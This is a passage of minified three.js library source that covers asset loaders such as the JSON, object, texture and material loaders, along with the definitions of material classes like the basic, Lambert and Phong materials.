0!==this.responseType&&(o.responseType=this.responseType),o.send(null),n.manager.itemStart(e)},setResponseType:function(e){this.responseType=e},setCrossOrigin:function(e){this.crossOrigin=e}},THREE.ImageLoader=function(e){this.manager=void 0!==e?e:THREE.DefaultLoadingManager},THREE.ImageLoader.prototype={constructor:THREE.ImageLoader,load:function(e,t,r,i){var n=this,a=THREE.Cache.get(e);if(void 0!==a)return void t(a);var o=document.createElement("img");return o.addEventListener("load",function(r){THREE.Cache.add(e,this),t&&t(this),n.manager.itemEnd(e)},!1),void 0!==r&&o.addEventListener("progress",function(e){r(e)},!1),void 0!==i&&o.addEventListener("error",function(e){i(e)},!1),void 0!==this.crossOrigin&&(o.crossOrigin=this.crossOrigin),o.src=e,n.manager.itemStart(e),o},setCrossOrigin:function(e){this.crossOrigin=e}},THREE.JSONLoader=function(e){THREE.Loader.call(this,e),this.withCredentials=!1},THREE.JSONLoader.prototype=Object.create(THREE.Loader.prototype),THREE.JSONLoader.prototype.constructor=THREE.JSONLoader,THREE.JSONLoader.prototype.load=function(e,t,r){r=r&&"string"==typeof r?r:this.extractUrlBase(e),this.onLoadStart(),this.loadAjaxJSON(this,e,t,r)},THREE.JSONLoader.prototype.loadAjaxJSON=function(e,t,r,i,n){var a=new XMLHttpRequest,o=0;a.onreadystatechange=function(){if(a.readyState===a.DONE)if(200===a.status||0===a.status){if(a.responseText){var s=JSON.parse(a.responseText),h=s.metadata;if(void 0!==h){if("object"===h.type)return void THREE.error("THREE.JSONLoader: "+t+" should be loaded with THREE.ObjectLoader instead.");if("scene"===h.type)return void THREE.error("THREE.JSONLoader: "+t+" seems to be a Scene. Use THREE.SceneLoader instead.")}var l=e.parse(s,i);r(l.geometry,l.materials)}else THREE.error("THREE.JSONLoader: "+t+" seems to be unreachable or the file is empty.");e.onLoadComplete()}else THREE.error("THREE.JSONLoader: Couldn't load "+t+" ("+a.status+")");else a.readyState===a.LOADING?n&&(0===o&&(o=a.getResponseHeader("Content-Length")),n({total:o,loaded:a.responseText.length})):a.readyState===a.HEADERS_RECEIVED&&void 0!==n&&(o=a.getResponseHeader("Content-Length"))},a.open("GET",t,!0),a.withCredentials=this.withCredentials,a.send(null)},THREE.JSONLoader.prototype.parse=function(e,t){function r(t){function r(e,t){return e&1<<t}var i,n,o,s,h,l,c,u,E,f,p,d,m,T,g,v,R,y,H,x,b,_,w,M,S,A,C,L=e.faces,P=e.vertices,F=e.normals,U=e.colors,B=0;if(void 0!==e.uvs){for(i=0;i<e.uvs.length;i++)e.uvs[i].length&&B++;for(i=0;B>i;i++)a.faceVertexUvs[i]=[]}for(s=0,h=P.length;h>s;)y=new THREE.Vector3,y.x=P[s++]*t,y.y=P[s++]*t,y.z=P[s++]*t,a.vertices.push(y);for(s=0,h=L.length;h>s;)if(f=L[s++],p=r(f,0),d=r(f,1),m=r(f,3),T=r(f,4),g=r(f,5),v=r(f,6),R=r(f,7),p){if(x=new THREE.Face3,x.a=L[s],x.b=L[s+1],x.c=L[s+3],b=new THREE.Face3,b.a=L[s+1],b.b=L[s+2],b.c=L[s+3],s+=4,d&&(E=L[s++],x.materialIndex=E,b.materialIndex=E),o=a.faces.length,m)for(i=0;B>i;i++)for(M=e.uvs[i],a.faceVertexUvs[i][o]=[],a.faceVertexUvs[i][o+1]=[],n=0;4>n;n++)u=L[s++],A=M[2*u],C=M[2*u+1],S=new THREE.Vector2(A,C),2!==n&&a.faceVertexUvs[i][o].push(S),0!==n&&a.faceVertexUvs[i][o+1].push(S);if(T&&(c=3*L[s++],x.normal.set(F[c++],F[c++],F[c]),b.normal.copy(x.normal)),g)for(i=0;4>i;i++)c=3*L[s++],w=new THREE.Vector3(F[c++],F[c++],F[c]),2!==i&&x.vertexNormals.push(w),0!==i&&b.vertexNormals.push(w);if(v&&(l=L[s++],_=U[l],x.color.setHex(_),b.color.setHex(_)),R)for(i=0;4>i;i++)l=L[s++],_=U[l],2!==i&&x.vertexColors.push(new THREE.Color(_)),0!==i&&b.vertexColors.push(new THREE.Color(_));a.faces.push(x),a.faces.push(b)}else{if(H=new THREE.Face3,H.a=L[s++],H.b=L[s++],H.c=L[s++],d&&(E=L[s++],H.materialIndex=E),o=a.faces.length,m)for(i=0;B>i;i++)for(M=e.uvs[i],a.faceVertexUvs[i][o]=[],n=0;3>n;n++)u=L[s++],A=M[2*u],C=M[2*u+1],S=new THREE.Vector2(A,C),a.faceVertexUvs[i][o].push(S);if(T&&(c=3*L[s++],H.normal.set(F[c++],F[c++],F[c])),g)for(i=0;3>i;i++)c=3*L[s++],w=new THREE.Vector3(F[c++],F[c++],F[c]),H.vertexNormals.push(w);if(v&&(l=L[s++],H.color.setHex(U[l])),R)for(i=0;3>i;i++)l=L[s++],H.vertexColors.push(new THREE.Color(U[l]));a.faces.push(H)}}function i(){var t=void 0!==e.influencesPerVertex?e.influencesPerVertex:2;if(e.skinWeights)for(var r=0,i=e.skinWeights.length;i>r;r+=t){var n=e.skinWeights[r],o=t>1?e.skinWeights[r+1]:0,s=t>2?e.skinWeights[r+2]:0,h=t>3?e.skinWeights[r+3]:0;a.skinWeights.push(new THREE.Vector4(n,o,s,h))}if(e.skinIndices)for(var r=0,i=e.skinIndices.length;i>r;r+=t){var l=e.skinIndices[r],c=t>1?e.skinIndices[r+1]:0,u=t>2?e.skinIndices[r+2]:0,E=t>3?e.skinIndices[r+3]:0;a.skinIndices.push(new THREE.Vector4(l,c,u,E))}a.bones=e.bones,a.bones&&a.bones.length>0&&(a.skinWeights.length!==a.skinIndices.length||a.skinIndices.length!==a.vertices.length)&&THREE.warn("THREE.JSONLoader: When skinning, number of vertices ("+a.vertices.length+"), skinIndices ("+a.skinIndices.length+"), and skinWeights ("+a.skinWeights.length+") should match."),a.animation=e.animation,a.animations=e.animations}function n(t){if(void 0!==e.morphTargets){var r,i,n,o,s,h;for(r=0,i=e.morphTargets.length;i>r;r++)for(a.morphTargets[r]={},a.morphTargets[r].name=e.morphTargets[r].name,a.morphTargets[r].vertices=[],s=a.morphTargets[r].vertices,h=e.morphTargets[r].vertices,n=0,o=h.length;o>n;n+=3){var l=new THREE.Vector3;l.x=h[n]*t,l.y=h[n+1]*t,l.z=h[n+2]*t,s.push(l)}}if(void 0!==e.morphColors){var r,i,c,u,E,f,p;for(r=0,i=e.morphColors.length;i>r;r++)for(a.morphColors[r]={},
a.morphColors[r].name=e.morphColors[r].name,a.morphColors[r].colors=[],E=a.morphColors[r].colors,f=e.morphColors[r].colors,c=0,u=f.length;u>c;c+=3)p=new THREE.Color(16755200),p.setRGB(f[c],f[c+1],f[c+2]),E.push(p)}}var a=new THREE.Geometry,o=void 0!==e.scale?1/e.scale:1;if(r(o),i(),n(o),a.computeFaceNormals(),a.computeBoundingSphere(),void 0===e.materials||0===e.materials.length)return{geometry:a};var s=this.initMaterials(e.materials,t);return this.needsTangents(s)&&a.computeTangents(),{geometry:a,materials:s}},THREE.LoadingManager=function(e,t,r){var i=this,n=0,a=0;this.onLoad=e,this.onProgress=t,this.onError=r,this.itemStart=function(e){a++},this.itemEnd=function(e){n++,void 0!==i.onProgress&&i.onProgress(e,n,a),n===a&&void 0!==i.onLoad&&i.onLoad()}},THREE.DefaultLoadingManager=new THREE.LoadingManager,THREE.BufferGeometryLoader=function(e){this.manager=void 0!==e?e:THREE.DefaultLoadingManager},THREE.BufferGeometryLoader.prototype={constructor:THREE.BufferGeometryLoader,load:function(e,t,r,i){var n=this,a=new THREE.XHRLoader(n.manager);a.setCrossOrigin(this.crossOrigin),a.load(e,function(e){t(n.parse(JSON.parse(e)))},r,i)},setCrossOrigin:function(e){this.crossOrigin=e},parse:function(e){var t=new THREE.BufferGeometry,r=e.data.attributes;for(var i in r){var n=r[i],a=new self[n.type](n.array);t.addAttribute(i,new THREE.BufferAttribute(a,n.itemSize))}var o=e.data.offsets;void 0!==o&&(t.offsets=JSON.parse(JSON.stringify(o)));var s=e.data.boundingSphere;if(void 0!==s){var h=new THREE.Vector3;void 0!==s.center&&h.fromArray(s.center),t.boundingSphere=new THREE.Sphere(h,s.radius)}return t}},THREE.MaterialLoader=function(e){this.manager=void 0!==e?e:THREE.DefaultLoadingManager},THREE.MaterialLoader.prototype={constructor:THREE.MaterialLoader,load:function(e,t,r,i){var n=this,a=new THREE.XHRLoader(n.manager);a.setCrossOrigin(this.crossOrigin),a.load(e,function(e){t(n.parse(JSON.parse(e)))},r,i)},setCrossOrigin:function(e){this.crossOrigin=e},parse:function(e){var t=new THREE[e.type];if(void 0!==e.color&&t.color.setHex(e.color),void 0!==e.emissive&&t.emissive.setHex(e.emissive),void 0!==e.specular&&t.specular.setHex(e.specular),void 0!==e.shininess&&(t.shininess=e.shininess),void 0!==e.uniforms&&(t.uniforms=e.uniforms),void 0!==e.vertexShader&&(t.vertexShader=e.vertexShader),void 0!==e.fragmentShader&&(t.fragmentShader=e.fragmentShader),void 0!==e.vertexColors&&(t.vertexColors=e.vertexColors),void 0!==e.shading&&(t.shading=e.shading),void 0!==e.blending&&(t.blending=e.blending),void 0!==e.side&&(t.side=e.side),void 0!==e.opacity&&(t.opacity=e.opacity),void 0!==e.transparent&&(t.transparent=e.transparent),void 0!==e.wireframe&&(t.wireframe=e.wireframe),void 0!==e.size&&(t.size=e.size),void 0!==e.sizeAttenuation&&(t.sizeAttenuation=e.sizeAttenuation),void 0!==e.materials)for(var r=0,i=e.materials.length;i>r;r++)t.materials.push(this.parse(e.materials[r]));return t}},THREE.ObjectLoader=function(e){this.manager=void 0!==e?e:THREE.DefaultLoadingManager,this.texturePath=""},THREE.ObjectLoader.prototype={constructor:THREE.ObjectLoader,load:function(e,t,r,i){""===this.texturePath&&(this.texturePath=e.substring(0,e.lastIndexOf("/")+1));var n=this,a=new THREE.XHRLoader(n.manager);a.setCrossOrigin(this.crossOrigin),a.load(e,function(e){n.parse(JSON.parse(e),t)},r,i)},setTexturePath:function(e){this.texturePath=e},setCrossOrigin:function(e){this.crossOrigin=e},parse:function(e,t){var r=this.parseGeometries(e.geometries),i=this.parseImages(e.images,function(){void 0!==t&&t(o)}),n=this.parseTextures(e.textures,i),a=this.parseMaterials(e.materials,n),o=this.parseObject(e.object,r,a);return(void 0===e.images||0===e.images.length)&&void 0!==t&&t(o),o},parseGeometries:function(e){var t={};if(void 0!==e)for(var r=new THREE.JSONLoader,i=new THREE.BufferGeometryLoader,n=0,a=e.length;a>n;n++){var o,s=e[n];switch(s.type){case"PlaneGeometry":case"PlaneBufferGeometry":o=new THREE[s.type](s.width,s.height,s.widthSegments,s.heightSegments);break;case"BoxGeometry":case"CubeGeometry":o=new THREE.BoxGeometry(s.width,s.height,s.depth,s.widthSegments,s.heightSegments,s.depthSegments);break;case"CircleGeometry":o=new THREE.CircleGeometry(s.radius,s.segments);break;case"CylinderGeometry":o=new THREE.CylinderGeometry(s.radiusTop,s.radiusBottom,s.height,s.radialSegments,s.heightSegments,s.openEnded);break;case"SphereGeometry":o=new THREE.SphereGeometry(s.radius,s.widthSegments,s.heightSegments,s.phiStart,s.phiLength,s.thetaStart,s.thetaLength);break;case"IcosahedronGeometry":o=new THREE.IcosahedronGeometry(s.radius,s.detail);break;case"TorusGeometry":o=new THREE.TorusGeometry(s.radius,s.tube,s.radialSegments,s.tubularSegments,s.arc);break;case"TorusKnotGeometry":o=new THREE.TorusKnotGeometry(s.radius,s.tube,s.radialSegments,s.tubularSegments,s.p,s.q,s.heightScale);break;case"BufferGeometry":o=i.parse(s);break;case"Geometry":o=r.parse(s.data).geometry}o.uuid=s.uuid,void 0!==s.name&&(o.name=s.name),t[s.uuid]=o}return t},parseMaterials:function(e,t){var r={};if(void 0!==e)for(var i=function(e){return void 0===t[e]&&THREE.warn("THREE.ObjectLoader: Undefined texture",e),t[e]},n=new THREE.MaterialLoader,a=0,o=e.length;o>a;a++){var s=e[a],h=n.parse(s);h.uuid=s.uuid,void 0!==s.name&&(h.name=s.name),void 0!==s.map&&(h.map=i(s.map)),void 0!==s.bumpMap&&(h.bumpMap=i(s.bumpMap),s.bumpScale&&(h.bumpScale=new THREE.Vector2(s.bumpScale,s.bumpScale))),void 0!==s.alphaMap&&(h.alphaMap=i(s.alphaMap)),void 0!==s.envMap&&(h.envMap=i(s.envMap)),void 0!==s.normalMap&&(h.normalMap=i(s.normalMap),s.normalScale&&(h.normalScale=new THREE.Vector2(s.normalScale,s.normalScale))),void 0!==s.lightMap&&(h.lightMap=i(s.lightMap)),void 0!==s.specularMap&&(h.specularMap=i(s.specularMap)),r[s.uuid]=h}return r},parseImages:function(e,t){var r=this,i={};if(void 0!==e&&e.length>0){var n=new THREE.LoadingManager(t),a=new THREE.ImageLoader(n);a.setCrossOrigin(this.crossOrigin);for(var o=function(e){return r.manager.itemStart(e),a.load(e,function(){r.manager.itemEnd(e)})},s=0,h=e.length;h>s;s++){var l=e[s],c=/^(\/\/)|([a-z]+:(\/\/)?)/i.test(l.url)?l.url:r.texturePath+l.url;i[l.uuid]=o(c)}}return i},parseTextures:function(e,t){var r={};if(void 0!==e)for(var i=0,n=e.length;n>i;i++){var a=e[i];void 0===a.image&&THREE.warn('THREE.ObjectLoader: No "image" speficied for',a.uuid),void 0===t[a.image]&&THREE.warn("THREE.ObjectLoader: Undefined image",a.image);var o=new THREE.Texture(t[a.image]);o.needsUpdate=!0,o.uuid=a.uuid,void 0!==a.name&&(o.name=a.name),void 0!==a.repeat&&(o.repeat=new THREE.Vector2(a.repeat[0],a.repeat[1])),void 0!==a.minFilter&&(o.minFilter=THREE[a.minFilter]),void 0!==a.magFilter&&(o.magFilter=THREE[a.magFilter]),void 0!==a.anisotropy&&(o.anisotropy=a.anisotropy),a.wrap instanceof Array&&(o.wrapS=THREE[a.wrap[0]],o.wrapT=THREE[a.wrap[1]]),r[a.uuid]=o}return r},parseObject:function(){var e=new THREE.Matrix4;return function(t,r,i){var n,a=function(e){return void 0===r[e]&&THREE.warn("THREE.ObjectLoader: Undefined geometry",e),r[e]},o=function(e){return void 0===i[e]&&THREE.warn("THREE.ObjectLoader: Undefined material",e),i[e]};switch(t.type){case"Scene":n=new THREE.Scene;break;case"PerspectiveCamera":n=new THREE.PerspectiveCamera(t.fov,t.aspect,t.near,t.far);break;case"OrthographicCamera":n=new THREE.OrthographicCamera(t.left,t.right,t.top,t.bottom,t.near,t.far);break;case"AmbientLight":n=new THREE.AmbientLight(t.color);break;case"DirectionalLight":n=new THREE.DirectionalLight(t.color,t.intensity);break;case"PointLight":n=new THREE.PointLight(t.color,t.intensity,t.distance,t.decay);break;case"SpotLight":n=new THREE.SpotLight(t.color,t.intensity,t.distance,t.angle,t.exponent,t.decay);break;case"HemisphereLight":n=new THREE.HemisphereLight(t.color,t.groundColor,t.intensity);break;case"Mesh":n=new THREE.Mesh(a(t.geometry),o(t.material));break;case"Line":n=new THREE.Line(a(t.geometry),o(t.material),t.mode);break;case"PointCloud":n=new THREE.PointCloud(a(t.geometry),o(t.material));break;case"Sprite":n=new THREE.Sprite(o(t.material));break;case"Group":n=new THREE.Group;break;default:n=new THREE.Object3D}if(n.uuid=t.uuid,void 0!==t.name&&(n.name=t.name),void 0!==t.matrix?(e.fromArray(t.matrix),e.decompose(n.position,n.quaternion,n.scale)):(void 0!==t.position&&n.position.fromArray(t.position),void 0!==t.rotation&&n.rotation.fromArray(t.rotation),void 0!==t.scale&&n.scale.fromArray(t.scale)),void 0!==t.visible&&(n.visible=t.visible),void 0!==t.userData&&(n.userData=t.userData),void 0!==t.children)for(var s in t.children)n.add(this.parseObject(t.children[s],r,i));return n}}()},THREE.TextureLoader=function(e){this.manager=void 0!==e?e:THREE.DefaultLoadingManager},THREE.TextureLoader.prototype={constructor:THREE.TextureLoader,load:function(e,t,r,i){var n=this,a=new THREE.ImageLoader(n.manager);a.setCrossOrigin(this.crossOrigin),a.load(e,function(e){var r=new THREE.Texture(e);r.needsUpdate=!0,void 0!==t&&t(r)},r,i)},setCrossOrigin:function(e){this.crossOrigin=e}},THREE.DataTextureLoader=THREE.BinaryTextureLoader=function(){this._parser=null},THREE.BinaryTextureLoader.prototype={constructor:THREE.BinaryTextureLoader,load:function(e,t,r,i){var n=this,a=new THREE.DataTexture,o=new THREE.XHRLoader;return o.setResponseType("arraybuffer"),o.load(e,function(e){var r=n._parser(e);r&&(void 0!==r.image?a.image=r.image:void 0!==r.data&&(a.image.width=r.width,a.image.height=r.height,a.image.data=r.data),a.wrapS=void 0!==r.wrapS?r.wrapS:THREE.ClampToEdgeWrapping,a.wrapT=void 0!==r.wrapT?r.wrapT:THREE.ClampToEdgeWrapping,a.magFilter=void 0!==r.magFilter?r.magFilter:THREE.LinearFilter,a.minFilter=void 0!==r.minFilter?r.minFilter:THREE.LinearMipMapLinearFilter,a.anisotropy=void 0!==r.anisotropy?r.anisotropy:1,void 0!==r.format&&(a.format=r.format),void 0!==r.type&&(a.type=r.type),void 0!==r.mipmaps&&(a.mipmaps=r.mipmaps),1===r.mipmapCount&&(a.minFilter=THREE.LinearFilter),a.needsUpdate=!0,t&&t(a,r))},r,i),a}},THREE.CompressedTextureLoader=function(){this._parser=null},THREE.CompressedTextureLoader.prototype={constructor:THREE.CompressedTextureLoader,load:function(e,t,r){var i=this,n=[],a=new THREE.CompressedTexture;a.image=n;var o=new THREE.XHRLoader;if(o.setResponseType("arraybuffer"),e instanceof Array)for(var s=0,h=function(r){o.load(e[r],function(e){var o=i._parser(e,!0);n[r]={width:o.width,height:o.height,format:o.format,mipmaps:o.mipmaps},s+=1,6===s&&(1==o.mipmapCount&&(a.minFilter=THREE.LinearFilter),a.format=o.format,a.needsUpdate=!0,t&&t(a))})},l=0,c=e.length;c>l;++l)h(l);else o.load(e,function(e){var r=i._parser(e,!0);if(r.isCubemap)for(var o=r.mipmaps.length/r.mipmapCount,s=0;o>s;s++){n[s]={mipmaps:[]};for(var h=0;h<r.mipmapCount;h++)n[s].mipmaps.push(r.mipmaps[s*r.mipmapCount+h]),n[s].format=r.format,n[s].width=r.width,n[s].height=r.height}else a.image.width=r.width,a.image.height=r.height,a.mipmaps=r.mipmaps;1===r.mipmapCount&&(a.minFilter=THREE.LinearFilter),a.format=r.format,a.needsUpdate=!0,t&&t(a)});return a}},THREE.Material=function(){Object.defineProperty(this,"id",{value:THREE.MaterialIdCount++}),this.uuid=THREE.Math.generateUUID(),this.name="",this.type="Material",this.side=THREE.FrontSide,this.opacity=1,this.transparent=!1,this.blending=THREE.NormalBlending,this.blendSrc=THREE.SrcAlphaFactor,this.blendDst=THREE.OneMinusSrcAlphaFactor,this.blendEquation=THREE.AddEquation,this.blendSrcAlpha=null,this.blendDstAlpha=null,this.blendEquationAlpha=null,this.depthTest=!0,this.depthWrite=!0,this.colorWrite=!0,this.polygonOffset=!1,this.polygonOffsetFactor=0,this.polygonOffsetUnits=0,this.alphaTest=0,this.overdraw=0,this.visible=!0,this._needsUpdate=!0},THREE.Material.prototype={constructor:THREE.Material,get needsUpdate(){return this._needsUpdate},set needsUpdate(e){e===!0&&this.update(),this._needsUpdate=e},setValues:function(e){if(void 0!==e)for(var t in e){var r=e[t];if(void 0!==r){if(t in this){var i=this[t];i instanceof THREE.Color?i.set(r):i instanceof THREE.Vector3&&r instanceof THREE.Vector3?i.copy(r):"overdraw"==t?this[t]=Number(r):this[t]=r}}else THREE.warn("THREE.Material: '"+t+"' parameter is undefined.")}},toJSON:function(){var e={metadata:{version:4.2,type:"material",generator:"MaterialExporter"},uuid:this.uuid,type:this.type};return""!==this.name&&(e.name=this.name),this instanceof THREE.MeshBasicMaterial?(e.color=this.color.getHex(),this.vertexColors!==THREE.NoColors&&(e.vertexColors=this.vertexColors),this.blending!==THREE.NormalBlending&&(e.blending=this.blending),this.side!==THREE.FrontSide&&(e.side=this.side)):this instanceof THREE.MeshLambertMaterial?(e.color=this.color.getHex(),e.emissive=this.emissive.getHex(),this.vertexColors!==THREE.NoColors&&(e.vertexColors=this.vertexColors),this.shading!==THREE.SmoothShading&&(e.shading=this.shading),this.blending!==THREE.NormalBlending&&(e.blending=this.blending),this.side!==THREE.FrontSide&&(e.side=this.side)):this instanceof THREE.MeshPhongMaterial?(e.color=this.color.getHex(),e.emissive=this.emissive.getHex(),e.specular=this.specular.getHex(),e.shininess=this.shininess,this.vertexColors!==THREE.NoColors&&(e.vertexColors=this.vertexColors),this.shading!==THREE.SmoothShading&&(e.shading=this.shading),this.blending!==THREE.NormalBlending&&(e.blending=this.blending),this.side!==THREE.FrontSide&&(e.side=this.side)):this instanceof THREE.MeshNormalMaterial?(this.blending!==THREE.NormalBlending&&(e.blending=this.blending),this.side!==THREE.FrontSide&&(e.side=this.side)):this instanceof THREE.MeshDepthMaterial?(this.blending!==THREE.NormalBlending&&(e.blending=this.blending),this.side!==THREE.FrontSide&&(e.side=this.side)):this instanceof THREE.PointCloudMaterial?(e.size=this.size,e.sizeAttenuation=this.sizeAttenuation,e.color=this.color.getHex(),this.vertexColors!==THREE.NoColors&&(e.vertexColors=this.vertexColors),this.blending!==THREE.NormalBlending&&(e.blending=this.blending)):this instanceof THREE.ShaderMaterial?(e.uniforms=this.uniforms,e.vertexShader=this.vertexShader,e.fragmentShader=this.fragmentShader):this instanceof THREE.SpriteMaterial&&(e.color=this.color.getHex()),this.opacity<1&&(e.opacity=this.opacity),this.transparent!==!1&&(e.transparent=this.transparent),this.wireframe!==!1&&(e.wireframe=this.wireframe),e},clone:function(e){return void 0===e&&(e=new THREE.Material),e.name=this.name,e.side=this.side,e.opacity=this.opacity,e.transparent=this.transparent,e.blending=this.blending,e.blendSrc=this.blendSrc,e.blendDst=this.blendDst,e.blendEquation=this.blendEquation,e.blendSrcAlpha=this.blendSrcAlpha,e.blendDstAlpha=this.blendDstAlpha,e.blendEquationAlpha=this.blendEquationAlpha,e.depthTest=this.depthTest,e.depthWrite=this.depthWrite,e.polygonOffset=this.polygonOffset,e.polygonOffsetFactor=this.polygonOffsetFactor,e.polygonOffsetUnits=this.polygonOffsetUnits,e.alphaTest=this.alphaTest,e.overdraw=this.overdraw,e.visible=this.visible,e},update:function(){this.dispatchEvent({type:"update"})},dispose:function(){this.dispatchEvent({type:"dispose"})}},THREE.EventDispatcher.prototype.apply(THREE.Material.prototype),THREE.MaterialIdCount=0,THREE.LineBasicMaterial=function(e){THREE.Material.call(this),this.type="LineBasicMaterial",this.color=new THREE.Color(16777215),this.linewidth=1,this.linecap="round",this.linejoin="round",this.vertexColors=THREE.NoColors,this.fog=!0,this.setValues(e)},THREE.LineBasicMaterial.prototype=Object.create(THREE.Material.prototype),THREE.LineBasicMaterial.prototype.constructor=THREE.LineBasicMaterial,THREE.LineBasicMaterial.prototype.clone=function(){var e=new THREE.LineBasicMaterial;return THREE.Material.prototype.clone.call(this,e),e.color.copy(this.color),e.linewidth=this.linewidth,e.linecap=this.linecap,e.linejoin=this.linejoin,e.vertexColors=this.vertexColors,e.fog=this.fog,e},THREE.LineDashedMaterial=function(e){THREE.Material.call(this),this.type="LineDashedMaterial",this.color=new THREE.Color(16777215),this.linewidth=1,this.scale=1,this.dashSize=3,this.gapSize=1,this.vertexColors=!1,this.fog=!0,this.setValues(e)},THREE.LineDashedMaterial.prototype=Object.create(THREE.Material.prototype),THREE.LineDashedMaterial.prototype.constructor=THREE.LineDashedMaterial,THREE.LineDashedMaterial.prototype.clone=function(){var e=new THREE.LineDashedMaterial;return THREE.Material.prototype.clone.call(this,e),e.color.copy(this.color),e.linewidth=this.linewidth,e.scale=this.scale,e.dashSize=this.dashSize,e.gapSize=this.gapSize,e.vertexColors=this.vertexColors,e.fog=this.fog,e},THREE.MeshBasicMaterial=function(e){THREE.Material.call(this),this.type="MeshBasicMaterial",this.color=new THREE.Color(16777215),this.map=null,this.lightMap=null,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=THREE.MultiplyOperation,this.reflectivity=1,this.refractionRatio=.98,this.fog=!0,this.shading=THREE.SmoothShading,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.vertexColors=THREE.NoColors,this.skinning=!1,this.morphTargets=!1,this.setValues(e)},THREE.MeshBasicMaterial.prototype=Object.create(THREE.Material.prototype),THREE.MeshBasicMaterial.prototype.constructor=THREE.MeshBasicMaterial,THREE.MeshBasicMaterial.prototype.clone=function(){var e=new THREE.MeshBasicMaterial;return THREE.Material.prototype.clone.call(this,e),e.color.copy(this.color),e.map=this.map,e.lightMap=this.lightMap,e.specularMap=this.specularMap,e.alphaMap=this.alphaMap,e.envMap=this.envMap,e.combine=this.combine,e.reflectivity=this.reflectivity,e.refractionRatio=this.refractionRatio,e.fog=this.fog,e.shading=this.shading,e.wireframe=this.wireframe,e.wireframeLinewidth=this.wireframeLinewidth,e.wireframeLinecap=this.wireframeLinecap,e.wireframeLinejoin=this.wireframeLinejoin,e.vertexColors=this.vertexColors,e.skinning=this.skinning,e.morphTargets=this.morphTargets,e},THREE.MeshLambertMaterial=function(e){THREE.Material.call(this),this.type="MeshLambertMaterial",this.color=new THREE.Color(16777215),this.emissive=new THREE.Color(0),this.wrapAround=!1,this.wrapRGB=new THREE.Vector3(1,1,1),this.map=null,this.lightMap=null,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=THREE.MultiplyOperation,this.reflectivity=1,this.refractionRatio=.98,this.fog=!0,this.shading=THREE.SmoothShading,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.vertexColors=THREE.NoColors,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)},THREE.MeshLambertMaterial.prototype=Object.create(THREE.Material.prototype),THREE.MeshLambertMaterial.prototype.constructor=THREE.MeshLambertMaterial,THREE.MeshLambertMaterial.prototype.clone=function(){var e=new THREE.MeshLambertMaterial;return THREE.Material.prototype.clone.call(this,e),e.color.copy(this.color),e.emissive.copy(this.emissive),e.wrapAround=this.wrapAround,e.wrapRGB.copy(this.wrapRGB),e.map=this.map,e.lightMap=this.lightMap,e.specularMap=this.specularMap,e.alphaMap=this.alphaMap,e.envMap=this.envMap,e.combine=this.combine,e.reflectivity=this.reflectivity,e.refractionRatio=this.refractionRatio,e.fog=this.fog,e.shading=this.shading,e.wireframe=this.wireframe,e.wireframeLinewidth=this.wireframeLinewidth,e.wireframeLinecap=this.wireframeLinecap,e.wireframeLinejoin=this.wireframeLinejoin,e.vertexColors=this.vertexColors,e.skinning=this.skinning,e.morphTargets=this.morphTargets,e.morphNormals=this.morphNormals,e},THREE.MeshPhongMaterial=function(e){THREE.Material.call(this),this.type="MeshPhongMaterial",this.color=new THREE.Color(16777215),this.emissive=new THREE.Color(0),this.specular=new THREE.Color(1118481),this.shininess=30,this.metal=!1,this.wrapAround=!1,this.wrapRGB=new THREE.Vector3(1,1,1),this.map=null,this.lightMap=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalScale=new THREE.Vector2(1,1),this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=THREE.MultiplyOperation,this.reflectivity=1,this.refractionRatio=.98,this.fog=!0,this.shading=THREE.SmoothShading,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.vertexColors=THREE.NoColors,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)},THREE.MeshPhongMaterial.prototype=Object.create(THREE.Material.prototype),THREE.MeshPhongMaterial.prototype.constructor=THREE.MeshPhongMaterial,THREE.MeshPhongMaterial.prototype.clone=function(){var e=new THREE.MeshPhongMaterial;return THREE.Material.prototype.clone.call(this,e),e.color.copy(this.color),e.emissive.copy(this.emissive),e.specular.copy(this.specular),e.shininess=this.shininess,e.metal=this.metal,e.wrapAround=this.wrapAround,e.wrapRGB.copy(this.wrapRGB),e.map=this.map,e.lightMap=this.lightMap,e.bumpMap=this.bumpMap,e.bumpScale=this.bumpScale,e.normalMap=this.normalMap,e.normalScale.copy(this.normalScale),e.specularMap=this.specularMap,e.alphaMap=this.alphaMap,e.envMap=this.envMap,e.combine=this.combine,e.reflectivity=this.reflectivity,e.refractionRatio=this.refractionRatio,e.fog=this.fog,e.shading=this.shading,e.wireframe=this.wireframe,e.wireframeLinewidth=this.wireframeLinewidth,e.wireframeLinecap=this.wireframeLinecap,e.wireframeLinejoin=this.wireframeLinejoin,e.vertexColors=this.vertexColors,e.skinning=this.skinning,e.morphTargets=this.morphTargets,e.morphNormals=this.morphNormals,e},THREE.MeshDepthMaterial=function(e){THREE.Material.call(this),this.type="MeshDepthMaterial",this.morphTargets=!1,this.wireframe=!1,this.wireframeLinewidth=1,this.setValues(e)},THREE.MeshDepthMaterial.prototype=Object.create(THREE.Material.prototype),THREE.MeshDepthMaterial.prototype.constructor=THREE.MeshDepthMaterial,THREE.MeshDepthMaterial.prototype.clone=function(){var e=new THREE.MeshDepthMaterial;return THREE.Material.prototype.clone.call(this,e),e.wireframe=this.wireframe,e.wireframeLinewidth=this.wireframeLinewidth,e},THREE.MeshNormalMaterial=function(e){THREE.Material.call(this,e),this.type="MeshNormalMaterial",this.wireframe=!1,this.wireframeLinewidth=1,this.morphTargets=!1,this.setValues(e)},THREE.MeshNormalMaterial.prototype=Object.create(THREE.Material.prototype),THREE.MeshNormalMaterial.prototype.constructor=THREE.MeshNormalMaterial,THREE.MeshNormalMaterial.prototype.clone=function(){var e=new THREE.MeshNormalMaterial;return THREE.Material.prototype.clone.call(this,e),e.wireframe=this.wireframe,e.wireframeLinewidth=this.wireframeLinewidth,e},THREE.MeshFaceMaterial=function(e){this.uuid=THREE.Math.generateUUID(),this.type="MeshFaceMaterial",this.materials=e instanceof Array?e:[]},THREE.MeshFaceMaterial.prototype={constructor:THREE.MeshFaceMaterial,toJSON:function(){for(var 